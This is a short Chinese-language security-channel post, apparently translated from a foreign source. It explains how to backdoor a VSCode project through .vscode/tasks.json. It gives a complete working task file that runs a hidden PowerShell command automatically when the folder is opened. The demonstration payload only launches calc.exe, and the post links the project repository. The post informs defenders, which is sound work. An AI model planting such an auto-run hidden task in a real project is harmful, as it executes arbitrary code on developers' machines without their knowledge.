---
title: VSCode 项目植入后门.vscode/tasks.json
url: https://mp.weixin.qq.com/s/ecDts-43Koh8kHO43MHeFg
source: Doonsec's feed
date: 2026-01-20
fetch_date: 2026-01-21T03:31:11.258482
---

# VSCode 项目植入后门.vscode/tasks.json

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taeEibeR4EXw1Aic5BuQf8t0OkJzuGM7oicLnOISIEMrhibknBzAtrayCeKPib7LHy700MVYCAOYj08KKAA/0?wx_fmt=jpeg)

# VSCode 项目植入后门.vscode/tasks.json

Ots安全

![]()

在小说阅读器中沉浸阅读

**威胁简报**

**恶意软件**

**漏洞攻击**

🐚 通过以下方式向 VSCode 项目植入后门.vscode/tasks.json

VSCode 允许通过文件自动执行任务tasks.json。攻击者可以利用这一特性，植入一个隐蔽的后门，在 VSCode 中打开该文件夹时执行任意代码。

🔧 技术概述

1. 在项目根目录下创建一个.vscode/目录（如果该目录尚不存在）。
2. 添加一个tasks.json包含以下内容的文件。

示例：运行计算器

calc.exe此示例运行一个隐藏的 PowerShell 命令，以便在 VSCode 中打开文件夹时启动。

```
{
  "version": "2.0.0",
"tasks": [
    {
      "label": "VS",
      "type": "shell",
      "command": "powershell",
      "args": [
        "-WindowStyle", "Hidden",
        "-Command",
        "Start-Process calc.exe"
      ],
      "problemMatcher": [],
      "group": {
        "kind": "build",
        "isDefault": true
      },
      "runOptions": {
        "runOn": "folderOpen"
      },
      "presentation": {
        "echo": false,
        "reveal": "never",
        "focus": false,
        "panel": "dedicated"
      }
    }
  ]
}
```

演示视频：

项目地址：

https://github.com/SaadAhla/VSCode-Backdoor

**END**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taeEibeR4EXw1Aic5BuQf8t0OkNSGAqXd7vakH3pichGXYNxQxP5rGU7OKZOH4zTtaLwl8SDYCt25NTibQ/640?wx_fmt=jpeg&from=appmsg)

公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址

排版 编辑 | Ots 小安

采集 翻译 | Ots Ai牛马

公众号 | AnQuan7 (Ots安全)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

Ots安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过